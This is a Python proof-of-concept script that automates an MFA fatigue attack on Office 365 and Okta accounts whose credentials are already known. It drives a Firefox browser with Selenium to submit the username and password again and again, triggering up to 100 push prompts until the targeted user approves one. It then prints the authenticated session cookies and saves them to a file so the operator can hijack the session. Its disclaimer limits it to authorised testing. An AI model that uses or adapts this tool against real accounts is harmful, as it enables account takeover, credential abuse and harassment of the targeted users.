#!/usr/bin/python3
# Author: https://github.com/siloed
# Description: A PoC Python script to cause MFA fatigue for known O365 credentials.
# Disclaimer:  To be used strictly for educational, authorised testing and research purposes only.
# Disclaimer: The author does not assume any responsibility for the use of this project. 
# Disclaimer: By using this project, you agree to use it at your own risk and acknowledge that the author is not liable for any misuse, damage, or legal consequences that may arise from its use.
# Examle run: python3 ./mfatigue.py -u Jonny@somewheretest.com -p "their password here"
# Run without any arguments for more info
# python3 ./mfatigue.py 
print("""
   _____  ________________      _____        __  .__                              
  /     \ \_   _____/  _  \   _/ ____\____ _/  |_|__| ____  __ __   ____          
 /  \ /  \ |    __)/  /_\  \  \   __\\__  \\   __\  |/ ___\|  |  \_/ __ \         
/    Y    \|     \/    |    \  |  |   / __ \|  | |  / /_/  >  |  /\  ___/         
\____|__  /\___  /\____|__  /  |__|  (____  /__| |__\___  /|____/  \___  > /\  /\ 
        \/     \/         \/              \/       /_____/             \/  \/  \/ 
\n""")
      
import argparse
import sys
#import re
#import requests
import time
import json
#import logging
import warnings
import traceback

# Using selenium for web input
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys	# used to send input


# to support driver wait
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import StaleElementReferenceException

#from selenium.webdriver.common.by import By
#from selenium.webdriver.support.ui import WebDriverWait # used to check if response loading is complete
#from selenium.webdriver.support.expected_conditions import staleness_of # used to support above page-load check
#from selenium.webdriver.support import expected_conditions as EC

# ignoring deprecated warnings for now
# import warnings
# warnings.filterwarnings("ignore", category=DeprecationWarning)

# Debugging stuff.. uncomment to proxy through and debug if required
# proxy1 = 'http://192.168.1.11:8080'
# proxy2 = 'http://192.168.1.11:8080'

# os.environ['http_proxy'] = proxy1
# os.environ['HTTP_PROXY'] = proxy1
# os.environ['https_proxy'] = proxy2
# os.environ['HTTPS_PROXY'] = proxy2

# Setting the office portal URL
URL1 = "https://portal.office.com"
target = URL1

# ! Note: Set input fields (these were grabbed from the O365 page. Times may likely change these)
username_inputfield_name = "loginfmt"
password_inputfield_id = "passwordInput"

# Okta username input field
okta_username_input_id = "okta-signin-username"
okta_password_input_name = "password" # as there was no fixed id to be found


# html element 'name' of the password field
# passwd -> for o365 console
# Password -> when in sts consode

# -- more optional settings below. currently commented out
# Set the HTTP proxy to be used by the Firefox profile
#-- Note : Uncomment the following three lines if you want to use proxy (e.g. burpsuite intercept)
# firefox_profile = webdriver.FirefoxProfile()
# firefox_profile.set_preference("network.proxy.type", 1)
# firefox_profile.set_preference("network.proxy.http", "192.168.1.11")
# firefox_profile.set_preference("network.proxy.http_port", 8080)

# Set up the Firefox options
firefox_options = webdriver.FirefoxOptions()

# try:
# 	driver.get(target)
# except Exception as e:
# 	output_line = "Timeout waiting for page load"

# function to just close driver and exit when error or when fully finished
def close_and_exit(driver):
	driver.close()
	exit()

# sleep function to help ADFS page load, if the user is redirected to ADFS (or similar company portal - might need more work if not ADFS)
def trywaitingmore(driver, wait):
    count = 1
    keysend_success = False
    while count <= 3:
        print("-- Sleeping for 1 second... to see if next page loads. And trying #" + str(count))
        time.sleep(1)
        # Try to find password input by ID
        try:
            print("-- Trying by inputid passwordInput on ADFS login page")
            passwordInput = wait.until(EC.visibility_of_element_located((By.ID, password_inputfield_id)))
            # passwordInput = driver.find_element(By.ID, "passwordInput")
        except NoSuchElementException:
            output_line = "-- ADFS Password input field not found yet. continue loop till end."
            print(output_line)
            count += 1
            continue
        except Exception as e:
            print("-- Error: Is the username valid??.. The following error occured. Exiting.")
            print(str(e))
            print("\n-- Trace error:")
            traceback.print_exc()
            close_and_exit(driver)
        else:
            print("(+) Password input field was found, entering password..")
            passwordInput.send_keys(user_password)
            passwordInput.send_keys(Keys.ENTER)
            keysend_success = True
            break
    if keysend_success:
        return True
    else:
        close_and_exit(driver)

# this function is used to identify the next input field to be filled 
def find_nextinputfield(driver, wait):
	# here we try to find what the next input field might be. whether its an input name field or password
	next_input_field_xpath = "//input[contains(@name, 'name') or contains(@name, 'password') or contains(@name, 'passwd')]"
	count = 1
	while count <= 3:
		try:
			print("-- Trying to find input field with 'name' or 'password' or 'passwd' in name attribute")
			input_fields  = wait.until(
				EC.presence_of_element_located((By.XPATH, next_input_field_xpath))
			)

			# Loop through the input fields and send keys based on their name attribute
			if len(input_fields) > 0:
				for input_field in input_fields:
					name_attr = input_field.get_attribute("name")
					if "name" in name_attr:
						print("(+) Sending username to an identified input field that contained text 'name'...")
						input_field.send_keys(user_name)		
						last_input_field = input_field				
					elif "password" in name_attr or "passwd" in name_attr:
						input_field.send_keys(user_password)
						last_input_field = input_field
						print("(+) Sending password to an identified input field that contained text 'password' or 'passwd' ...")
					
				# Once all input fields are filled send enter key
				# Send an Enter key to the last filled input field
				if last_input_field:
					last_input_field.send_keys(Keys.ENTER)
				else:
					print("No input fields with 'name' or 'password' or 'passwd' in name attribute were found.")
			else:
				print("No input fields with 'name' or 'password' or 'passwd' in name attribute were found.")
				print("-- Sleeping for 1 second... to see if next page loads. And trying #" + str(count))
				time.sleep(1)
				count += 1
				continue
		except NoSuchElementException:
			print("-- Input field with 'name' or 'password' or 'passwd' in name attribute not found. Continuing loop.")
			print("-- Sleeping for 1 second... to see if next page loads. And trying #" + str(count))
			time.sleep(1)
			count += 1
			continue
		except TimeoutException:
			output_line = "-- Timeout waiting for page load or username, password input fields to appear"
			print("-- Sleeping for 10 more seconds... to see if next page loads. And trying #" + str(count))
			time.sleep(10)
			count += 1
			continue
		except Exception as e:
			output_line = str(e)
			print(output_line)
			close_and_exit(driver)


# # this function is used to identify the input name field
# # the following funciton currently NOT used
# def find_name_inputfield(driver, wait):
# 	# here we try to find what the next input field might be. whether its an input name field or password
# 	#next_input_field_xpath = "//input[contains(@name, 'name') or contains(@name, 'password') or contains(@name, 'passwd')]"
# 	next_input_field_xpath = "//input[translate(@name, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz')='name']"
# 	count = 1
# 	while count <= 3:
# 		try:
# 			print("-- Trying to find input field that contain 'name' (e.g. username) in the input field.")
# 			input_fields  = wait.until(
# 				EC.presence_of_element_located((By.XPATH, next_input_field_xpath))
# 			)

# 			# Initialize the last_input_field variable to None
# 			last_name_field = None

# 			# Loop through the input fields and send keys based on their name attribute
# 			if len(input_fields) > 0:
# 				for input_field in input_fields:
# 					name_attr = input_field.get_attribute("name")
# 					if "name" in name_attr.lower():
# 						print("(+) Sending username to an identified input field that contained text 'name'...")
# 						input_field.send_keys(user_name)		
# 						last_name_field = input_field				
# 					# elif "password" in name_attr or "passwd" in name_attr:
# 					# 	input_field.send_keys(user_password)
# 					# 	last_input_field = input_field
# 					# 	print("(+) Sending password to an identified input field that contained text 'password' or 'passwd' ...")
					
# 				# Once all input fields are filled send enter key
# 				# Send an Enter key to the last filled input field
# 				if last_name_field:
# 					last_name_field.send_keys(Keys.ENTER)
# 					return True
# 				else:
# 					print("No input fields with 'name' were found.")
# 			else:
# 				print("No input fields with 'name' in name attribute were found.")
# 				print("-- Sleeping for 1 second... to see if next page loads. And trying #" + str(count))
# 				time.sleep(1)
# 				count += 1
# 				continue
# 		except NoSuchElementException:
# 			print("-- Input field with 'name' in name attribute not found. Continuing loop.")
# 			print("-- Sleeping for 1 second... to see if next page loads. And trying #" + str(count))
# 			time.sleep(1)
# 			count += 1
# 			continue
# 		except TimeoutException:
# 			output_line = "-- Timeout waiting for page load or username input field to appear"
# 			print("-- Sleeping for 10 more seconds... to see if next page loads. And trying #" + str(count))
# 			time.sleep(10)
# 			count += 1
# 			continue
# 		except Exception as e:
# 			output_line = str(e)
# 			print(output_line)
# 			print("\n-- Trace error:")
# 			traceback.print_exc()
# 			close_and_exit(driver)
# 	# else sending input to name field was not successful
# 	return False
# #^-- above function is currently not used..

# Function to perform Okta auth
def perform_okta_auth(driver, wait):
	count = 1
	okta_keysend_success = False
	while count <= 3:
		try:
			print("(+) Trying to find Okta username field by id "+okta_username_input_id+ ", and send username.")
			oktaUsernameInput = wait.until(EC.visibility_of_element_located((By.ID, okta_username_input_id)))

			# Get the current URL -- this is so useful to help us check if next page has loaded after sending the ENTER key. 
			# ..else webdriver seems to check for elements in the current page which leads to mistakes
			current_url = driver.current_url

			# Send keys to the username input field
			oktaUsernameInput.send_keys(user_name)
				
			# Try to submit it by pressing enter - (pressing enter here seems to work better than .submit() method, which gives an error)
			oktaUsernameInput.send_keys(Keys.ENTER)

			# Wait for the URL to change
			wait.until(EC.url_changes(current_url))
			
			okta_keysend_success = True
			print("(+) Sending Okta username a success..")
			break
		except NoSuchElementException:
			print("-- Input field with ID " + str(okta_username_input_id) +" in name attribute not found. Continuing loop.")
			print("-- Sleeping for 1 second... to see if next page loads. And trying #" + str(count))
			time.sleep(1)
			count += 1
			continue
		except TimeoutException:
			output_line = "-- Timeout waiting for page load or username input field to appear"
			print("-- Sleeping for 10 more seconds... to see if next page loads. And trying #" + str(count))
			time.sleep(10)
			count += 1
			continue
		except Exception as e:
			output_line = str(e)
			print(output_line)
			print("\n-- Trace error:")
			traceback.print_exc()
			close_and_exit(driver)
	
	# if Okta username entry was succcess now lets try password 
	if okta_keysend_success:	
		count = 1
		while count <= 3:
			try:
				print("(+) Now trying to find Okta pass field by name "+okta_password_input_name+ ", and send password.")
				oktaPasswordInput = wait.until(EC.visibility_of_element_located((By.NAME, okta_password_input_name)))

				# Get the current URL -- this is so useful to help us check if next page has loaded after sending the ENTER key. 
				# ..else webdriver seems to check for elements in the current page which leads to mistakes
				current_url = driver.current_url

				# Send keys to the username input field
				oktaPasswordInput.send_keys(user_password)
					
				# Try to submit it by pressing enter - (pressing enter here seems to work better than .submit() method, which gives an error)
				oktaPasswordInput.send_keys(Keys.ENTER)

				# Wait for the URL to change
				wait.until(EC.url_changes(current_url))
				
				okta_keysend_success = True
				print("(+) Sending Okta password a success..")

				if okta_keysend_success:
					# Now perform Okta push.. if push notifications are enabled
					print("(+) Now trying to send Okta push notifications, if push enabled.")
					while count <= 3:
						try:
							# Find the submit button and click on it
							okta_submit_button_detection = "//input[@type='submit']"

							# submit_button = wait.until(EC.presence_of_element_located((By.XPATH, okta_submit_button_detection)))
							# submit_button.click()
							# Okta is tricky that it tries to obscruct auomatic click. so we are tring to scroll down and click
							# using the "EC.element_to_be_clickable()" expected condition instead of "EC.visibility_of_element_located()"
							# ..to ensure that the element is not only present on the page, but also clickable and stable before trying to interact with it
							#-- old: submit_button = wait.until(EC.visibility_of_element_located((By.XPATH, okta_submit_button_detection)))
							submit_button = wait.until(EC.element_to_be_clickable((By.XPATH, okta_submit_button_detection)))

							# sleep for one second before sending push. 
							# ..not sure if this will help reduce suspicion for Okta and minimise chance of number display, but just trying..
							time.sleep(1)
							#input("(+) Press any key to continue...")
							# scroll to the button location in page
							driver.execute_script("arguments[0].scrollIntoView();", submit_button)
													
							submit_button.click()
							print("(+) Push notification sent successfuly!")
							return True
							break
						except NoSuchElementException:
							print("-- Error: Push button not found on the page. Is Okta push notifcations enabled?")
							close_and_exit(driver)
						except StaleElementReferenceException:
							print("-- Error: The submit button is stale. Retrying...")
							count += 1
							continue						

				# return True
				# break
			except NoSuchElementException:
				print("-- Input field with 'name' in name attribute not found. Continuing loop.")
				print("-- Sleeping for 1 second... to see if next page loads. And trying #" + str(count))
				time.sleep(1)
				count += 1
				continue
			except TimeoutException:
				output_line = "-- Timeout waiting for page load or username input field to appear"
				print("-- Sleeping for 10 more seconds... to see if next page loads. And trying #" + str(count))
				time.sleep(10)
				count += 1
				continue
			except StaleElementReferenceException:
				print("-- Error: The submit button is stale. Retrying...")
				continue
			except Exception as e:
				output_line = str(e)
				print(output_line)
				print("\n-- Trace error:")
				traceback.print_exc()
				close_and_exit(driver)
	
	# if auth not successful
	return False		

# -- above: is the fucntion to perfomr okt aauth

# function to check auth type
def check_auth_type(driver, wait):
	# here we try to find what the next input field might be. whether its an input name field or password
	#next_input_field_xpath = "//input[contains(@name, 'name') or contains(@name, 'password') or contains(@name, 'passwd')]"
	next_input_field_xpath = "//input[not(@type='hidden')][contains(@name, 'name') or contains(@name, 'password') or contains(@name, 'passwd')]"
	
	count = 1
	while count <= 3:
		try:
			print("-- Trying to find input field with 'name' or 'password' or 'passwd' in name attribute")
			input_fields  = wait.until(
				EC.presence_of_all_elements_located((By.XPATH, next_input_field_xpath))
			)

			# Loop through the input fields and send keys based on their name attribute
			if len(input_fields) > 0:
				for input_field in input_fields:
					name_attr = input_field.get_attribute("name")
					if "name" in name_attr:
						print("-- Found input field that contained text 'name'. checking for Okta id")
						id_attr = input_field.get_attribute("id")
						if (id_attr == okta_username_input_id):
							print("(+) Okta auth page username entry field found.")	
							return "okta_auth"
					elif "password" in name_attr or "passwd" in name_attr:
						print("(+) 'password' or 'passwd' found in input fields Returnig for usual oauth2.0 at office portal.")	
						name_attr = input_field.get_attribute("name")
						id_attr = input_field.get_attribute("id")
						print(f"Input field name attribute: {name_attr}, id attribute: {id_attr}")
						return "office_oauth2_0"
		except NoSuchElementException:
			print("-- Input field with 'name' or 'password' or 'passwd' in name attribute not found. Continuing loop.")
			print("-- Sleeping for 1 second... to see if next page loads. And trying #" + str(count))
			time.sleep(1)
			count += 1
			continue
		except TimeoutException:
			output_line = "-- Timeout waiting for page load or username, password input fields to appear"
			print("-- Sleeping for 10 more seconds... to see if next page loads. And trying #" + str(count))
			time.sleep(10)
			count += 1
			continue
		except Exception as e:
			output_line = str(e)
			print(output_line)
			print("\n-- Trace error:")
			traceback.print_exc()
			close_and_exit(driver)
		
		# return false if no auth type matched
		return False
#-- ^ above function is to check auth type --

# One of the Functions where we try to auth with given creds		
def try_userauth(driver, wait):	
	keysend_success = False
	try:
		# Now this is the first login page at O365. This does not change. Any okta etc login page comes after this
		driver.get(target)
		# Wait for the username input field to be visible    		
		usernameInput = wait.until(EC.visibility_of_element_located((By.NAME, username_inputfield_name)))
		
		# Get the current URL -- this is so useful to help us check if next page has loaded after sending the ENTER key. 
		# ..else webdriver seems to check for elements in the current page which leads to mistakes
		current_url = driver.current_url

		# Send keys to the username input field
		usernameInput.send_keys(user_name)
			
		# Try to submit it by pressing enter - (pressing enter here seems to work better than .submit() method, which gives an error)
		usernameInput.send_keys(Keys.ENTER)

		# Wait for the URL to change
		wait.until(EC.url_changes(current_url))
		
		keysend_success = True
	except TimeoutException:
		output_line = "-- Timeout waiting for page load or username, password input fields to appear"
		print(output_line)
		close_and_exit(driver)
	except Exception as e:
		output_line = str(e)
		close_and_exit(driver)

	# If username input was successful, only then proceed to password input
	if keysend_success:
		# Here's the tricky bit, where we'd either be redirected to company login or be at Office portal password entry pgae
		# .. lets find out where we are at and acct accordingly
		# Call the check_auth_type function and store the result in auth_type variable
		global auth_type # needs to mention this before i can update a global variable.. apparently
		auth_type = check_auth_type(driver, wait)
		
		# Use the match statement to execute a block of code based on the value of auth_type
		match auth_type:
			case "okta_auth":
				# Execute code for basic authentication
				print("(+) Okta auth page found.")

				# if Okta auth, lets try performing Okta auth
				return perform_okta_auth(driver, wait)
			case "office_oauth2_0":
			# 	# Execute code for OAuth authentication
			# 	token = "my_oauth_token"
			# 	login_with_oauth(token)
				print("(+) Normal office portal Oauth 2.0 page found. Continuing to password entry.")
				# code will continue to below
			case _:
				# Execute code for other types of authentication
				print("Unknown authentication type:")
				# -- but continue in case its ADFS, which we are handling below
				# input("(+) Press any key to exit...")
				# close_and_exit(driver)
		

		# Wait for the next page to finish loading
		wait.until(EC.presence_of_element_located((By.XPATH, "//input[@name='passwd' or @id='passwordInput']")))
		
		# Try to find password input by name
		try:
			print("(+) Trying to find and inject input element named 'passwd'")
			passwordInput = wait.until(EC.visibility_of_element_located((By.NAME, "passwd")))
			#passwordInput = driver.find_element(By.NAME, "passwd")
		except NoSuchElementException:
			print("-- no such element so trying adfs")
			# Try to find password input by ID
			try:
				print("(+) Trying by inputid passwordInput on ADFS login page")
				passwordInput = wait.until(EC.visibility_of_element_located((By.ID, password_inputfield_id)))
				#passwordInput = driver.find_element(By.ID, "passwordInput")
			except NoSuchElementException:
				output_line = "Password input field not found. Exiting."
				print(output_line)
				close_and_exit(driver)
			except Exception as e:
				print("-- Error: Are the credentials valid??.. The following error occured. Exiting.")
				print(str(e))
				close_and_exit(driver)
			else:
				print("(+) Password input field was found for ADFS auth page, entering password..")
				passwordInput.send_keys(user_password)
				passwordInput.send_keys(Keys.ENTER)
				return True
		except TimeoutException:
			# do not pass 'passwordInput' below. its done within function. else it will lead to 'referenced before assignment' error
			return trywaitingmore(driver, wait)  
		except Exception as e:
			print(str(e))
			close_and_exit(driver)
		else:
			print("(+) Password input field was found, entering password...")
			passwordInput.send_keys(user_password)
			passwordInput.send_keys(Keys.ENTER)			
			return True

# this function is specific to OKTA MFA, there is a another mfa check function for usual o365 MFA defined  next
# update:  we currently do not need this function as check_mfa_received() next can handle both auth types ok so far.
# def check_okta_specific_mfa_received(driver, wait):
# 	print("(+) Okta auth credentials seem successful. Waiting for user to accept MFA auth..")

# 	# then for upto 55 seconds wait for MFA acceptance before starting the process again for a new MFA push
# 	mfa_acceptance_received = False
# 	mfa_maxwait_seconds = 55
# 	for i in range(mfa_maxwait_seconds):
# 		print(driver.current_url)
# 		# Check if the current URL matches one of the expected URLs
# 		if "https://login.microsoftonline.com/common/SAS/ProcessAuth" in driver.current_url or "https://login.microsoftonline.com/kmsi" in driver.current_url or "https://www.office.com/" in driver.current_url:
# 			print("\n (+) MFA authentication successful.")
# 			mfa_acceptance_received = True
		
# 			# Print the session cookie values
# 			print("\n(+) --- Printing obtained session cookies below. Use them in your browser sesison -------\n")  
# 			session_cookies = driver.get_cookies()
# 			session_cookies_json = json.dumps(session_cookies)
# 			print(session_cookies_json)
# 			print("\n(+)----------\n")  

# 			# write the session cookie to the file	
# 			with open("captured_mfa_authed_sesisons.txt", "a") as f:
# 				f.write('\n------ Capture session for: ' + user_name + ' -----------\n')
# 				f.write(session_cookies_json)
# 				f.write("\n-------End.----------------------------\n")
			
# 			print("(+) Captured session written to: .\captured_mfa_authed_sesisons.txt")
# 			break
		
# 		# sleep one second till next loop
# 		print(f"Countdown: {mfa_maxwait_seconds - i:02}", end="\r", flush=True)
# 		time.sleep(1)
	
# 	return mfa_acceptance_received	

# ^ above function is specific to OKTA MFA, there is a another mfa check function for usual o365 MFA defined  next
# ^ update:  we currently do not need above function as check_mfa_received() below can handle both auth types ok so far.

# this function below is for o365 MFA - it waits and checks if MFA has been received for the user
def check_mfa_received(driver, wait):
	if (auth_type == "office_oauth2_0"):
		# Wait for the page to finish loading - if at this page, we should know the password was success and just waiting for MFA acceptance
		try:
			wait.until(EC.url_contains("https://login.microsoftonline.com/common/login"))
		except Exception as e:
			print("\n-- Could not load authd page. Check your credentials?..")
			print("-- Exiting.")
			close_and_exit(driver)

	print("(+) Credentials seem successful. Waiting for user to accept MFA auth..")

	# then for upto 55 seconds wait for MFA acceptance before starting the process again for a new MFA push
	mfa_acceptance_received = False
	# mfa_maxwait_seconds = 55 #-- this is now defined in main input
	for i in range(mfa_maxwait_seconds):
		#print(driver.current_url)
		# Check if the current URL matches one of the expected URLs
		if ("https://login.microsoftonline.com/common/SAS/ProcessAuth" in driver.current_url or "https://login.microsoftonline.com/kmsi" in driver.current_url or 
      		"https://www.office.com/" in driver.current_url or "https://www.microsoft365.com/" in driver.current_url):
			print("\n (+) MFA authentication successful.")
			mfa_acceptance_received = True
		
			# Print the session cookie values
			print("\n(+) --- Printing obtained session cookies below. Use them in your browser sesison -------\n")  
			session_cookies = driver.get_cookies()
			session_cookies_json = json.dumps(session_cookies)
			print(session_cookies_json)
			print("\n(+)----------\n")  

			# write the session cookie to the file	
			with open("captured_mfa_authed_sesisons.txt", "a") as f:
				f.write('\n------ Capture session for: ' + user_name + ' -----------\n')
				f.write(session_cookies_json)
				f.write("\n-------End.----------------------------\n")
			
			print("(+) Captured session written to: .\captured_mfa_authed_sesisons.txt")
			break
		
		# sleep one second till next loop
		print(f"Countdown: {mfa_maxwait_seconds - i:02}", end="\r", flush=True)
		time.sleep(1)
	
	return mfa_acceptance_received


# get to causing MFA feature
def cause_fatigue():       
	
	try:
		# we'll try to use local geckodriver version as incompatible versions could cause grief
		# troublehsoot here if geckodriver does still give you trouble.
		# using geckodriver from local folder as explained above:
		gecko = "./geckodriver"	
		# Set up the Firefox service using the updated Firefox profile
		from selenium.webdriver.firefox.service import Service
		#from selenium.webdriver.firefox.options import Options
		service = Service(gecko)
		driver = webdriver.Firefox(service=service, options=firefox_options)

		# or, comment out the above bunch (upto 'try:'), and just uncomment and  below..,
		# .. if you want to use your default geckodriver (eg. which geckodriver => /usr/bin/geckodriver).
		# driver = webdriver.Firefox(options=firefox_options)
		# or .. even this if you want to debug stuff using proxy options above. Uncomment the proxy setting section as well:
		# driver = webdriver.Firefox(firefox_profile=firefox_profile, options=firefox_options)
	except Exception as e:
		print("-- ./geckodriver => not found or some error loading it with FireFox. Have you put the 'geckodriver' in the current folder?..")
		print("-- see error below for troubleshooting.")
		print(str(e))
		exit()

	# Setting the default timeout for fetching any web page.
	wait = WebDriverWait(driver, 10)

	result = None
	while not result:
		result = try_userauth(driver, wait)
		time.sleep(1) # wait for 1 second before checking again

	if result == True: # means above credential auth has been succes. Moving on to waitng for MFA acceptance by user
		# now lets check if the MFA has been received
		mfa_acceptance_received = check_mfa_received(driver, wait)	    
		if mfa_acceptance_received:		
			print("\n(+) Yaay! looks like we got MFA sesison!!!")

			# ask the user if they want to keep the browser window open with the active user sesison (else they can use the captured text)
			while True:
				user_input = input("(+) Do you want to keep this browser session open? (y/n) ")
				if user_input.lower() == 'y':
					# do something if user enters 'y'
					input("(+) Ok. Leaving browser open for you. Press any key to exit this python script...")
					exit()
				elif user_input.lower() == 'n':
					# then continue to close down and exit
					break
				else:
					print("-- Invalid input. Please enter 'y' or 'n'.")
			driver.close()
			return True
		else:
			# we couldn't get MFA within specified mfa push wait period (seconds), lets close current driver and restart process
			driver.close()
			global current_mfa_attempt # needs to mention this before i can update a global variable.. apparently
			current_mfa_attempt += 1
			
			if (current_mfa_attempt <= number_of_mfas_to_send):
				print("\n-- User has not accepted MFA auth within " + str(mfa_maxwait_seconds) + " seconds. Pushing fresh MFA prompt #" +str(current_mfa_attempt)+ ".." )
				# to to the next round
				cause_fatigue()
			else:
				print("\n-- User has not accepted MFA auth and we have reached the max attempts you specified :" + str(number_of_mfas_to_send))
				print("-- Stoppin here.")
	
	# close the driver if its not been closed already
	try:
		driver.close()
	except:
		pass

	return
		

#-- Main section stats ----

# create the parser
parser = argparse.ArgumentParser(description='Python3 script to push MFA prompts for office portal authentication. Requires a valid username and password as input.')

# add arguments
parser.add_argument('-u', '--username', type=str, required=True, help='Username')
parser.add_argument('-p', '--password', type=str, required=False, help='Password')
parser.add_argument('-spf', '--single-pass-file', type=str, required=False, help='Single password textfile. Password should be in the first line.')
parser.add_argument('--max-mfa', type=int, help='Max MFA pushes (Default: 3)')
parser.add_argument('--max-mfa-wait', type=int, help='Max wait period for an MFA push accept before sending another. (Default: 55 seconds)')


# If no arguments were passed, print usage examples
if len(sys.argv) == 1:
    print(f"(+) Usage: {sys.argv[0]} --username <username> --password <password> --max-mfa <optional: MFA pushes count 1 - 100 (default = 3)> --max-mfa-wait <optional>")
    print("\n(+) A Few examples below:")
    print(f'-- Example: python3 {sys.argv[0]} --username johnsmith@email.com --password "P@ssword123"')
    print(f'-- Example: python3 {sys.argv[0]} -u targetuser@clientdomain.com -p "P@ssword123"')
    print(f'-- Example: python3 {sys.argv[0]} -u targetuser@clientdomain.com -p "Password including single \'quote\' example"')
    
    print('\n (+) If there are special charactors in the password, escape them with a backslash:')
    print(f'-- Example: python3 {sys.argv[0]} -u targetuser@clientdomain.com -p "Password including escaped double \\"quote\\" example"')
    print(f'-- Example: python3 {sys.argv[0]} -u targetuser@clientdomain.com -p "Password including escaped \\\\backslashes\\\\ example"')
    print(f'-- Example: python3 {sys.argv[0]} -u targetuser@clientdomain.com -p "Password including escaped \\! example"')
    
    print('\n (+) Alternatively for a complex password, you can provide it as an input file (--single-pass-file):')
    print(f'-- Example: python3 {sys.argv[0]} -u targetuser@clientdomain.com -spf ./password.txt')

    sys.exit()

# parse the arguments
args = parser.parse_args()

# read username
user_name = args.username

# check if password is provided
if (args.password):
	user_password = args.password
elif (args.single_pass_file):	
	# try to read the user password from first line of provided file
	try:		
		with open(args.single_pass_file, 'r') as file:
			user_password = file.readline()
	except FileNotFoundError:
		print(f"-- Error: File {args.single_pass_file} does not exist.")
		exit(1)
	except Exception as e:
		print("-- Error: Unable to read password from the input file.")
		print(str(e))
		exit(1)
else:
	print("-- Error: User password not specified")
	exit(1)

# Setting the default max MFA pushes to 3, if operator has not specified any
number_of_mfas_to_send = args.max_mfa or 3
# Check the range. Over-ride here if needed. but be careful.
if not 1 <= number_of_mfas_to_send <= 100:
    print("-- Error: Max MFA pushes should be between 1 and 100")
    exit(1)

# Setting the default max MFA wait period, to wait for a user to accept the MFA push to 55 seconds,.. if operator has not specified any
mfa_maxwait_seconds  = args.max_mfa_wait or 55
# Check the push wait range. Over-ride here if needed. but be careful.
if not 0 <= mfa_maxwait_seconds:
    print("-- Error: Max MFA wait period should be 0 or more seconds")
    exit(1)
elif mfa_maxwait_seconds < 15:
	# Give a final warning to user on likely MFA DoS
	print("""-- Warning!: Less than 15 seconds specified for MFA push wait.
-- This will likely be insuffient for the user to view and action a MFA push..
-- Addtionally, the script may not have sufficient time to identify an MFA accept by user, leading to a MFA DoS for the taret user!		
-- Therefore, recommend you use at least 15 seconds or stick to the default of 55 seconds.	    
	""");
	# ask the user if they want to keep the browser window open with the active user sesison (else they can use the captured text)
	while True:
		user_input = input("-- Are you sure you want to still continue with this low wait period (y/n)?: ")
		if user_input.lower() == 'y':
			# do something if user enters 'y'
			input("(+) Warning accepted. Continuing as you wish...")
			break
		elif user_input.lower() == 'n':
			# then continue to close down and exit
			input("(+) Ok. Press any key to safely exit this python script now...")
			exit()
		else:
			print("-- Invalid input. Please enter 'y' or 'n'.")
	
	# adding 3 more seconds to allow waiting for caputuring MFA acceptance. Still may not be sufficient when lower than 10 seconds
	# .. manually over-ride here in code if needed
	mfa_maxwait_seconds += 3

# print the values of the arguments
print('Username:', user_name)
print('Password:', user_password)
print('Max MFA attempts:', str(number_of_mfas_to_send))
print('Max MFA push wait:' + str(mfa_maxwait_seconds) + " seconds.")
print()

# If you want to test manually:
# user_name = "invaliduserxx@fakecorp.com"
# user_password = "some-fake-password-test123"

# Setting a starting point
current_mfa_attempt = 1 # just a global counter to keep track

# Calling the MFA workflow here
cause_fatigue()

input("(+) Press any key to exit...")

#-- Main section ends ----